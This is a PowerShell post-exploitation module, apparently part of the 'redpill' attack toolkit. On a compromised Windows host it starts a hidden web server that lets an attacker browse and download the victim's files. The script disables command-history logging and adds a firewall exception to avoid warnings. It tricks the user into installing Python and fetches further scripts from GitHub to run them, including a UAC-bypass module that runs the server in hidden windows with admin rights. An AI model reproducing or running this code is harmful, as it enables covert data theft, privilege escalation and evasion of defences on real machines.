<#
.SYNOPSIS
   Start Local HTTP WebServer (Background)

   Author: @MarkusScholtes|@r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: BitsTransfer
   PS cmdlet Dev version: v1.0.2

.NOTES
   Access WebServer: http://<RHOST>:8080/
   This module download's webserver.ps1 or Start-WebServer.ps1
   to remote host %TMP% and executes it on an hidden terminal prompt
   to allow users to silent browse/read/download files from remote host.

.Parameter StartWebServer
   Accepts arguments: Python and Powershell

.Parameter SPort
   Accepts webserver port number (default: 8080)

.EXAMPLE
   PS C:\> .\StartWebServer.ps1 -StartWebServer Python
   Downloads webserver.ps1 to %TMP% and executes the webserver.
   Remark: This Module uses Social Enginnering to trick remote host into
   installing python (python http.server) if remote host does not have it.

.EXAMPLE
   PS C:\> .\StartWebServer.ps1 -StartWebServer Python -SPort 8087
   Downloads webserver.ps1 and executes the webserver on port 8087

.EXAMPLE
   PS C:\> .\StartWebServer.ps1 -StartWebServer Powershell
   Downloads Start-WebServer.ps1 and executes the webserver.
   Remark: Admin privileges are requiered in shell to run the WebServer

.EXAMPLE
   PS C:\> .\StartWebServer.ps1 -StartWebServer Powershell -SPort 8087
   Downloads Start-WebServer.ps1 and executes the webserver on port 8087
   Remark: Admin privileges are requiered in shell to run the WebServer
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$StartWebServer="false",
   [int]$SPort='8080'
)


$Address = (## Get Local IpAddress
    Get-NetIPConfiguration|Where-Object {
        $_.IPv4DefaultGateway -ne $null -and
        $_.NetAdapter.status -ne "Disconnected"
    }
).IPv4Address.IPAddress


## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
If($StartWebServer -ieq "Python" -or $StartWebServer -ieq "Powershell"){

    ## Chose what WebServer to use (Python|Powershell)
    If($StartWebServer -ieq "Python"){## Python http.server sellected as webserver
        If(-not(Test-Path -Path "$Env:TMP\webserver.ps1")){## Make sure auxiliary module exists on remote host
            Write-Host "Downloading webserver.ps1 from github" -ForegroundColor Green
            Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/webserver.ps1 -Destination $Env:TMP\webserver.ps1 -ErrorAction SilentlyContinue|Out-Null   
         }

         ## Check downloaded file integrity
         $SizeDump = ((Get-Item -Path "$Env:TMP\webserver.ps1" -EA SilentlyContinue).length/1KB)
         If($SizeDump -lt 42){## Corrupted download detected => DefaultFileSize: 42,1943359375/KB
             Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
             If(Test-Path -Path "$Env:TMP\webserver.ps1"){Remove-Item -Path "$Env:TMP\webserver.ps1" -Force}
         }Else{
             ## Force the install of python 2 times if NOT installed on remote host
             Write-Host "[i] StopServer: Powershell -File `$Env:TMP\webserver.ps1 -SKill 1" -ForegroundColor Yellow
             powershell -File "$Env:TMP\webserver.ps1" -SForce 1 -SBind $Address -Sport $SPort
         }

    }ElseIf($StartWebServer -ieq "Powershell"){## Powershell sellected as webserver
        $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");
        If($IsClientAdmin){## Start-WebServer requires Administrator rigths to run
            If(-not(Test-Path -Path "$Env:TMP\Start-WebServer.ps1")){## Make sure auxiliary module exists on remote host
                Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Start-WebServer.ps1 -Destination $Env:TMP\Start-WebServer.ps1 -ErrorAction SilentlyContinue|Out-Null
            }

            ## Add firewall rule to prevent connection detected warning msgbox
            netsh advfirewall firewall show rule name="Start-WebServer"|Out-Null
            If(-not($? -ieq "True")){## Remote Firewall rule not found ...
                write-host "[bypass] Adding Start-WebServer firewall rule." -ForeGroundColor Yellow
                netsh advfirewall firewall add rule name="Start-WebServer" description="venom v1.0.17 - powershell (SE) webserver" program="$PsHome\powershell.exe" dir=in action=allow protocol=TCP enable=yes|Out-Null
            }

            ## Check downloaded file integrity
            $SizeDump = ((Get-Item -Path "$Env:TMP\Start-WebServer.ps1" -EA SilentlyContinue).length/1KB)
            If($SizeDump -lt 25){## Corrupted download detected => DefaultFileSize: 25,44921875/KB
                Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
                If(Test-Path -Path "$Env:TMP\Start-WebServer.ps1"){Remove-Item -Path "$Env:TMP\Start-WebServer.ps1" -Force}
            }Else{
                powershell -File $Env:TMP\Start-WebServer.ps1 "http://${Address}:$Sport/"
            }

        }Else{## ERROR: Shell running under UserLand Privileges

            Write-Host "[error:] Shell - administrator privileges required!" -ForegroundColor Red -BackgroundColor Black
            Write-Host "[bypass] Exec @redpill UacMe Module to elevate cmdlet privs!" -ForegroundColor Yellow

            ## Download required files from GitHub!
            If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue)){
               iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1" -OutFile "$Env:TMP\UacMe.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
               If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue)){
                  Write-Host "[error:] failed to download $Env:TMP\UacMe.ps1" -ForegroundColor Red -BackgroundColor Black
                  Start-Sleep -Seconds 1;exit ## Exit @StartWebServer
               }
            }

            If(-not(Test-Path -Path "$Env:TMP\Start-WebServer.ps1")){## Make sure auxiliary module exists on remote host
                iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Start-WebServer.ps1" -OutFile "$Env:TMP\Start-WebServer.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
            }

            ## Add firewall rule to prevent connection detected warning msgbox
            netsh advfirewall firewall show rule name="Start-WebServer"|Out-Null
            If(-not($? -ieq "True")){## Remote Firewall rule not found ...
                write-host "[bypass] Add Start-WebServer firewall exception rule!" -ForeGroundColor Yellow
                Start-Sleep -Milliseconds 500;write-host "[descri] venom v1.0.17 - powershell (SE) webserver" -ForeGroundColor Yellow
                netsh advfirewall firewall add rule name="Start-WebServer" description="venom v1.0.17 - powershell (SE) webserver" program="$PsHome\powershell.exe" dir=in action=allow protocol=TCP enable=yes|Out-Null
            }

            ## Execute EOP t0 execute Start-WebServer.ps1 cmdlet with admin privileges!
            powershell -WindowStyle Hidden -File "$Env:TMP\UacMe.ps1" -Action Elevate -Execute "powershell -WindowStyle Hidden -File $Env:TMP\Start-WebServer.ps1 `"http://${Address}:$Sport/`""

        }
    }
    Write-Host "";Start-Sleep -Seconds 1
}
